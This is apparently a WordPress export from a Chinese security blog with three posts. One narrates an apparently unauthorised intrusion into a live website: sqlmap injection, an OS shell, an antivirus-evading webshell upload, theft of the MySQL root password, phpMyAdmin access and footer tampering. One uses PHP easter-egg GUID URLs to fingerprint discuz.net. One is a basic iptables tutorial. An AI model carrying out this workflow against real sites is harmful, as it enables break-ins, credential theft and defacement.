		<wp:meta_key><![CDATA[_oembed_ef65bc9569a6fd0f65cb16c527e244f5]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_418cae2d29718e826980ffbe12c4f734]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_9314a8267e512b585b23df6ae944ab52]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_6d4dc0394328b700ccb4b8b23388e5df]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_663df9da47d7b93052032579bd2e170b]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_56fc88d357e57b78d40e584840fb0a1c]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_ff3365dcfb7ba7d0febd8169e9d909c4]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_b8bf159aa88827eb57448e962998fc66]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_a8b72086e0debbdf2f06b40987d0c1d8]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_5b9f893f328c150c4567af2174eca5f8]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_0db6616ae1a5d740bf49536d83cead4f]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_5fb15652a87672fb993b089c6bcdbeee]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_27cbb524a1e9cdaeda14b7f6c3f78415]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_a480ea7c76f06ae6ac78885374b50614]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_3167182fd4b31e3bb24daca0c0d0e7c0]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_db06391e2df2c638f505937bf8372ab7]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_9bf22cb35ac769eb294e6291c5d9e01f]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_c218a1a27e0868b2ffe08c95847d71b4]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_c85300b8c5f200cada004aed57c707be]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_91c2fbe35e89f53516429708ad80d145]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_40afbcdd5ff8628af5360814d0f80d6b]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_726bebc4016a8ccf132553a400138b26]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_dae275c6a457f3b532da1a05bbe3529a]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_0afa8cf1190ce4b3ef3a89b74173d59f]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_4940f4a6a00c8057b5d4bf20062bbff9]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_7e1915ce8607cd945317c01b23f35fcb]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_ed1bdfeefa2b6f67d08af718609e0361]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_9eb57c5c7732804021520ba93ea60d4e]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_e07fb5b6271103fd1c34866f5705ac74]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_b402e9002f1153a2ac7d336959de7f62]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_f2685090f4a69dac87a8ea890e510457]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_7d3eb3d5a898b0c3003416e679794311]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_016bbbbef783fe6850b16ec8ea1109e5]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_f5d26e5b42143b33ab4065e055d068c6]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_a136517a19659780dd67307b95fbe852]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_a9e55b007bc7fee2dfe0699d3e6042c8]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_861a4079a53e134018eabe8333bd9dbf]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_3e18c5ad943d02f29ebd88737746ee73]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_0f14eb33b6ae84200a370626666e9673]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_68f3c468bfd08b1ad651dc79af2caa48]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_bdb617fb4fa53307a81e15fffaec71af]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_9a3a073381bb4030f39c643e289ace38]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>诸多漏洞的网站入侵实验</title>
		<link>https://www.nervgeek.com/2015/10/18/%e8%af%b8%e5%a4%9a%e6%bc%8f%e6%b4%9e%e7%9a%84%e7%bd%91%e7%ab%99%e5%85%a5%e4%be%b5%e5%ae%9e%e9%aa%8c/</link>
		<pubDate>Sun, 18 Oct 2015 13:06:16 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=248</guid>
		<description></description>
		<content:encoded><![CDATA[先使用w3af扫描网站漏洞，发现一个有GET注入点的网址。
换上sqlmap扫描有注入点的网址，加上--tables参数，发现能爆库。
<a href="https://www.nervgeek.com/wp-content/uploads/2016/01/c4ca4238a0b923820dcc509a6f75849b.png"><img class="alignnone size-full wp-image-249" src="https://www.nervgeek.com/wp-content/uploads/2016/01/c4ca4238a0b923820dcc509a6f75849b.png" alt="1" width="734" height="480" /></a>
<a href="https://www.nervgeek.com/wp-content/uploads/2016/01/c4ca4238a0b923820dcc509a6f75849b.jpg"><img class="alignnone size-full wp-image-250" src="https://www.nervgeek.com/wp-content/uploads/2016/01/c4ca4238a0b923820dcc509a6f75849b.jpg" alt="1" width="1150" height="634" /></a>
<!--more-->
立马使用--os-shell看能不能成功。
<a href="https://www.nervgeek.com/wp-content/uploads/2016/01/c81e728d9d4c2f636f067f89cc14862c.png"><img class="alignnone size-full wp-image-251" src="https://www.nervgeek.com/wp-content/uploads/2016/01/c81e728d9d4c2f636f067f89cc14862c.png" alt="2" width="1430" height="689" /></a>
成功！然后从网站得知这个服务器环境支持php，选择4。
<a href="https://www.nervgeek.com/wp-content/uploads/2016/01/eccbc87e4b5ce2fe28308fd9f2a7baf3.png"><img class="alignnone size-full wp-image-252" src="https://www.nervgeek.com/wp-content/uploads/2016/01/eccbc87e4b5ce2fe28308fd9f2a7baf3.png" alt="3" width="1055" height="171" /></a>
1是暴力尝试可上传的路径，2是自定义上传路径，通过我不断挖掘，发现这个网站配置实在是漏洞百出，不仅找到绝对路径，还找到一个uploadfile这个路径有写入权限，立马写上。
<a href="https://www.nervgeek.com/wp-content/uploads/2016/01/a87ff679a2f3e71d9181a67b7542122c.png"><img class="alignnone size-full wp-image-253" src="https://www.nervgeek.com/wp-content/uploads/2016/01/a87ff679a2f3e71d9181a67b7542122c.png" alt="4" width="1440" height="317" /></a>
随即打开这个地址，发现最低下有一个上传框。
<a href="https://www.nervgeek.com/wp-content/uploads/2016/01/e4da3b7fbbce2345d7772b0674a318d5.png"><img class="alignnone size-full wp-image-254" src="https://www.nervgeek.com/wp-content/uploads/2016/01/e4da3b7fbbce2345d7772b0674a318d5.png" alt="5" width="421" height="153" /></a>
在这里可以上传大马，前提是他服务器没有杀毒防范。
或者上传免杀木马，虽然也有可能被杀。
也可以上传一句话木马，使用菜刀链接。
我上传了免杀大马，发现服务器并没有杀掉，完全能用！
&nbsp;
<a href="https://www.nervgeek.com/wp-content/uploads/2016/01/1679091c5a880faf6fb5e6087eb1b2dc.png"><img class="alignnone size-full wp-image-255" src="https://www.nervgeek.com/wp-content/uploads/2016/01/1679091c5a880faf6fb5e6087eb1b2dc.png" alt="6" width="1401" height="502" /></a>
接下来四处翻服务器，找到一个php页面内写着mysql的root账号密码，还找到phpmyadmin的路径，尝试访问，秒进！
<a href="https://www.nervgeek.com/wp-content/uploads/2016/01/8f14e45fceea167a5a36dedd4bea2543.jpg"><img class="alignnone size-full wp-image-257" src="https://www.nervgeek.com/wp-content/uploads/2016/01/8f14e45fceea167a5a36dedd4bea2543.jpg" alt="7" width="1180" height="569" /></a>
找到他们首页footer的位置，提醒了下网站管理员做好相关防范就撤了，并没有提权干坏事。
<a href="https://www.nervgeek.com/wp-content/uploads/2016/01/c9f0f895fb98ab9159f51fd0297e236d.png"><img class="alignnone size-full wp-image-256" src="https://www.nervgeek.com/wp-content/uploads/2016/01/c9f0f895fb98ab9159f51fd0297e236d.png" alt="8" width="518" height="67" /></a>
&nbsp;
&nbsp;]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>248</wp:post_id>
		<wp:post_date><![CDATA[2015-10-18 21:06:16]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2015-10-18 13:06:16]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[%e8%af%b8%e5%a4%9a%e6%bc%8f%e6%b4%9e%e7%9a%84%e7%bd%91%e7%ab%99%e5%85%a5%e4%be%b5%e5%ae%9e%e9%aa%8c]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="sqlmap"><![CDATA[sqlmap]]></category>
		<category domain="post_tag" nicename="w3af"><![CDATA[w3af]]></category>
		<category domain="post_tag" nicename="%e5%85%a5%e4%be%b5"><![CDATA[入侵]]></category>
		<category domain="post_tag" nicename="%e5%8e%9f%e5%88%9b"><![CDATA[原创]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
		<category domain="category" nicename="%e7%bd%91%e7%bb%9c%e5%ae%89%e5%85%a8"><![CDATA[网络安全]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[181]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>利用“PHP彩蛋”进行敏感信息获取</title>
		<link>https://www.nervgeek.com/2015/10/19/%e5%88%a9%e7%94%a8php%e5%bd%a9%e8%9b%8b%e8%bf%9b%e8%a1%8c%e6%95%8f%e6%84%9f%e4%bf%a1%e6%81%af%e8%8e%b7%e5%8f%96/</link>
		<pubDate>Mon, 19 Oct 2015 06:51:57 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=259</guid>
		<description></description>
		<content:encoded><![CDATA[关于“PHP彩蛋”的说法也许很多老PHPer已经都知道或听说了，好像是早在PHP4版本的时候就有彩蛋了，挺好玩儿的，可能近年来逐渐被人们遗忘了，其实彩蛋功能在PHP脚本引擎默认情况下是开启。
下面就用Discuz官方论坛做一下测试：
<b><img src="https://www.nervgeek.com/wp-content/uploads/2016/01/528a64b1afc4aa6dabda55d940e4c315.jpg" alt="" border="0" /></b>
<!--more-->
<img src="https://www.nervgeek.com/wp-content/uploads/2016/01/6435d8fcf2dfc0a13a7f1847777ee506.jpg" alt="" border="0" />
<img src="https://www.nervgeek.com/wp-content/uploads/2016/01/0cc2a79cf050279689abe347fd97481b.jpg" alt="" border="0" />
<img src="https://www.nervgeek.com/wp-content/uploads/2016/01/1bb47197f126b4b8c99a693068ec58da.jpg" alt="" border="0" />
http://www.discuz.net/?=PHPE9568F34-D428-11d2-A769-00AA001ACF42
http://www.discuz.net/?=PHPE9568F35-D428-11d2-A769-00AA001ACF42
http://www.discuz.net/?=PHPE9568F36-D428-11d2-A769-00AA001ACF42
http://www.discuz.net/?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000
如上4个链接加红色的部分是PHP源码/ext/standard/info.h中定义的GUID值，如下图所示
<img src="https://www.nervgeek.com/wp-content/uploads/2016/01/d251992cf19bb90382deed4ad44eca59.jpg" alt="" border="0" />
<b>关于PHP彩蛋这个玩法已经被国外的某些Web<a class="keylink" href="http://www.2cto.com/" target="_blank">漏洞</a>扫描器（例如：HP WebInspect）所使用了，用其来探测被扫描的网站使用的是何种Web开发语言。其实在渗透测试过程中经常遇见某些网站难以辨别出使用了何种Web开发语言，因为有些网站采用动态脚本生成纯静态HTML页或者是采用URL重写实现伪静态</b><b>页面</b><b>，如果网站使用的是<a class="keylink" href="http://www.2cto.com/kf/web/php/" target="_blank">PHP</a>开发的话，可以尝试使用彩蛋的探测法，在很多情况下可以一针见血的鉴定出来，因为默认情况下彩蛋的功能在php.ini中是开启的，当然如果不想让别人通过彩蛋的方式来获取网站的敏感信息的话，那就在php.ini中将expose_php = Off即可！</b>
&nbsp;
<b>看完上面这些可能有些人会说既然</b><b>php.ini中的expose_php = On，那么</b><b>直接抓包看看http头信息不就OK了，可是某些大站点Web服务器的前面都是有反向代理服务器的，所以还不能完全依赖于捕获http头中的信息。</b>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>259</wp:post_id>
		<wp:post_date><![CDATA[2015-10-19 14:51:57]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2015-10-19 06:51:57]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[%e5%88%a9%e7%94%a8php%e5%bd%a9%e8%9b%8b%e8%bf%9b%e8%a1%8c%e6%95%8f%e6%84%9f%e4%bf%a1%e6%81%af%e8%8e%b7%e5%8f%96]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<category domain="post_tag" nicename="php"><![CDATA[php]]></category>
		<category domain="post_tag" nicename="%e5%bd%a9%e8%9b%8b"><![CDATA[彩蛋]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
		<category domain="category" nicename="%e7%bd%91%e7%bb%9c%e5%ae%89%e5%85%a8"><![CDATA[网络安全]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_21d71b80e425de1e74e13d35a3adc3d2]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_578786c906fc8ee2966dc73aba16b7e6]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_4290e848f5c1a1e23159c4df9f508a8d]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_b7504d845ac593a7abab0a2437acae66]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_e723ca8040255e55cf0256f14214beb0]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_e2c3f387ac57fb84e51621631e5784d5]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_3aaed6f43ed265680fb91c47e9728cf3]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_fd8c04b57023df95b31edf19a3ec3fbb]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[175]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_18b0fba558040e4acd5f99586d7b40ba]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_9d6dea6f0fe49fb0806c79320c7d390b]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_2740a1ad5fdf37464a89beebd1264932]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_27f0cc0430c1406d7a27a98691504431]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_8da8f1ed008e175b83be7e8aea9fef42]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_b6bf400ee7e4e643d909ba1b079c7526]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_f963cab52960c4188a8abb770091ae65]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_9a5936dc67514d3fa3f649c9de6bebf5]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_d858cb5ac5f354e575bb276d926aae24]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_8695cf7a89461187f8677a8f8cedbe67]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_71cf4496e01cb34d5f2f2706498fe9b2]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_3c20d016a3530ec9e69a21345d1a822f]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>Iptables入门教程</title>
		<link>https://www.nervgeek.com/2015/10/22/iptables%e5%85%a5%e9%97%a8%e6%95%99%e7%a8%8b/</link>
		<pubDate>Thu, 22 Oct 2015 05:25:20 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=267</guid>
		<description></description>
		<content:encoded><![CDATA[<h2><strong>0x00 iptables介绍</strong></h2>

<hr />

&nbsp;
linux的包过滤功能，即linux防火墙，它由netfilter 和 iptables 两个组件组成。
netfilter 组件也称为内核空间，是内核的一部分，由一些信息包过滤表组成，这些表包含内核用来控制信息包过滤处理的规则集。
iptables 组件是一种工具，也称为用户空间，它使插入、修改和除去信息包过滤表中的规则变得容易。
<img src="https://www.nervgeek.com/wp-content/uploads/2016/01/34e7fe9d71f4076dd4fbf7a0f5e1d570.png" alt="2014041522224868618.png" />
&nbsp;
&nbsp;
<!--more-->

<h2><strong>0x01 iptables的结构</strong></h2>

<hr />

&nbsp;
iptables的结构：
iptables -&gt; Tables -&gt; Chains -&gt; Rules
简单地讲，tables由chains组成，而chains又由rules组成。iptables 默认有四个表Filter, NAT, Mangle, Raw，其对于的链如下图。
<img src="https://www.nervgeek.com/wp-content/uploads/2016/01/2f24868a7de0aa983e6942f3a99254d5.jpg" alt="enter image description here" />
&nbsp;
&nbsp;

<h2><strong>0x02 iptables工作流程</strong></h2>

<hr />

&nbsp;
<img src="https://www.nervgeek.com/wp-content/uploads/2016/01/c8d175643e50d26abb2e5819e42a22d3.jpg" alt="enter image description here" />
&nbsp;
&nbsp;

<h2><strong>0x03 filter表详解</strong></h2>

<hr />

&nbsp;
<strong>1. 在iptables中，filter表起过滤数据包的功能，它具有以下三种内建链：</strong>
INPUT链 – 处理来自外部的数据。
OUTPUT链 – 处理向外发送的数据。
FORWARD链 – 将数据转发到本机的其他网卡设备上。
<strong>2. 数据流向场景</strong>
访问本机：在INPUT链上做过滤
本机访问外部：在OUTPUT链上做过滤
通过本机访问其他主机:在FORWARD链上做过滤
<strong>3. Iptables基本操作</strong>
启动iptables：<code>service iptables start</code>
关闭iptables：<code>service iptables stop</code>
重启iptables：<code>service iptables restart</code>
查看iptables状态：<code>service iptables status</code>
保存iptables配置：<code>service iptables save</code>
Iptables服务配置文件：<code>/etc/sysconfig/iptables-config</code>
Iptables规则保存文件：<code>/etc/sysconfig/iptables</code>
打开iptables转发：<code>echo "1"&gt; /proc/sys/net/ipv4/ip_forward</code>
&nbsp;
&nbsp;

<h2><strong>0x04 iptables命令参考</strong></h2>

<hr />

&nbsp;
命令：
iptables [ -t 表名] 命令选项 [链名] [条件匹配] [-j 目标动作或跳转]
1. 表名
表名：Filter, NAT, Mangle, Raw
起包过滤功能的为表Filter，可以不填，不填默认为Filter
2. 命令选项
选项名 功能及特点
-A 在指定链的末尾添加（--append）一条新的规则
-D 删除（--delete）指定链中的某一条规则，按规则序号或内容确定要删除的规则
-I 在指定链中插入（--insert）一条新的规则，默认在链的开头插入
-R 修改、替换（--replace）指定链中的一条规则，按规则序号或内容确定
-L 列出（--list）指定链中的所有的规则进行查看，默认列出表中所有链的内容
-F 清空（--flush）指定链中的所有规则，默认清空表中所有链的内容
-N 新建（--new-chain）一条用户自己定义的规则链
-X 删除指定表中用户自定义的规则链（--delete-chain）
-P 设置指定链的默认策略（--policy）
-n 用数字形式（--numeric）显示输出结果，若显示主机的 IP地址而不是主机名
-P 设置指定链的默认策略（--policy）
-v 查看规则列表时显示详细（--verbose）的信息
-V 查看iptables命令工具的版本（--Version）信息
-h 查看命令帮助信息（--help）
--line-number 查看规则列表时，同时显示规则在链中的顺序号
3. 链名
可以根据数据流向来确定具体使用哪个链，在Filter中的使用情况如下：
INPUT链 – 处理来自外部的数据。
OUTPUT链 – 处理向外发送的数据。
FORWARD链 – 将数据转发到本机的其他网卡设备上。
4. 条件匹配
条件匹配分为基本匹配和扩展匹配，拓展匹配又分为隐式扩展和显示扩展。
a)基本匹配包括：
匹配参数 说明
-p 指定规则协议，如tcp, udp,icmp等，可以使用all来指定所有协议
-s 指定数据包的源地址参数，可以使IP地址、网络地址、主机名
-d 指定目的地址
-i 输入接口
-o 输出接口
b)隐式扩展包括：
enter image description here
c)常用显式扩展
enter image description here
5. 目标值
数据包控制方式包括四种为：
ACCEPT：允许数据包通过。
DROP：直接丢弃数据包，不给出任何回应信息。
REJECT：拒绝数据包通过，必须时会给数据发送端一个响应信息。
LOG：在/var/log/messages 文件中记录日志信息，然后将数据包传递给下一条规则。
QUEUE：防火墙将数据包移交到用户空间
